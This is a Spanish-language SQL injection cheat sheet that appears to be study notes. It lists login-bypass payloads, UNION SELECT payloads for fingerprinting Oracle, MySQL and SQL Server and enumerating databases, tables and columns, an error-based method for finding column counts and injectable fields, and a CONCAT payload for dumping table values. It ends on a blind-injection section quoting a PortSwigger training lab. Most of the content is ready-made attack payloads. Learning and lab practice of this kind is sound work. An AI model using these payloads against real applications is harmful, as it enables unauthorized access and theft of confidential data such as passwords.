# SQL Injection
La inyección SQL es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante insertar código SQL malicioso en las consultas a una base de datos. Esto puede comprometer la integridad de los datos, revelar información confidencial o permitir acciones no autorizadas en el sistema afectado.

## Payloads de autenticación
```sql
abc' or 1=1-- -
abc' or 1=1#
abc' or '1'='1
```
## Recopilar información de la base de datos
### Version
#### Oracle
```sql
' union select BANNER,null from v$version-- -
' union select VERSION,null from V$INSTANCE-- -
```
#### MySQL
```sql
' union select @@version,null-- -
' union select VERSION(),null-- -
```
#### Microsoft SQL Server
```sql
' union select @@version,null-- -
' union select SERVERPROPERTY('productversion'),null-- -
```
### Bases de datos
#### Non-Oracle
```sql
' union select null,DISTINCT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
#### Oracle
```sql
' union select null,DISTINCT(USERNAME) FROM ALL_USERS-- -
```
### Tablas
#### Non-Oracle
```sql
' union select null,table_name FROM information_schema.tables-- -
```
#### Oracle
```sql
' union select null,table_name from all_tables-- -
```
### Columnas
#### Non-Oracle
```sql
' union select null,column_name FROM information_schema.columns where table_name='NOMBRE DE LA TABLA'-- -
```
#### Oracle
```sql
' union select null,column_name from all_tab_columns where table_name='NOMBRE DE LA TABLA'-- -
```
## Metodologia inyección basada en errores
### Determinar el numero de columnas
```sql
abc' order by 3-- -
# Respuesta 200 OK
abc' order by 20 -- -
# Respuesta 500 Internal Server Error
```
Hay por lo menos 3 columnas y menos de 20, cambiar los numeros hasta determinar el numero de columnas. Una vez encontrado el numero iniciaremos una query union select.

Supongamos que el numero de columnas reflejado es 4 primero lo confirmaremos de la siguiente forma
```sql
abc' union select null,null,null,null-- -
```
### Determinar los campos de los que se puede obtener informacion
Ahora determinaremos cual de los 4 campos es de tipo cadena para poder hacer querys sobre ese campo, introduciremos una cadena aleatoria dentro de cada uno para ver cual es reflejado.
```sql
abc' union select 'v0ydRT',null,null,null-- - # 500
abc' union select null,'v0ydRT',null,null-- - # 500
abc' union select null,null,'v0ydRT',null-- - # 200 -> Aqui se pueden injectar querys
abc' union select null,null,null,'v0ydRT'-- - # 500
```
Despues de eso se utiliza toda la informacion aterior para recopilar la informacion de la base de datos.


## Dumpear todos los valores de N numeros de columnas en una sola consulta (MySQL)
Suponiendo que despues de utilizar la metodologia anterior solo podemos injectar sentencias en un campo, podemos utilizar la funcion CONCAT() para extraer valores del numero de columnas que queramos
```sql
' union select null,CONCAT(COLUMNA 1,':',COLUMNA 2) from TABLA-- -
```
## Metodologia inyección a ciegas (Blind SQL injection)
En un ataque blind SQL injection el atacante explora la base de datos mediante consultas que, dependiendo de la respuesta del servidor (como respuestas verdaderas o falsas), le permiten inferir datos confidenciales o estructura de la base de datos sin acceder directamente a los resultados.

Ejemplo: El laboratorio https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

"This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called ```users```, with columns called ```username``` and ```password```. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user. "
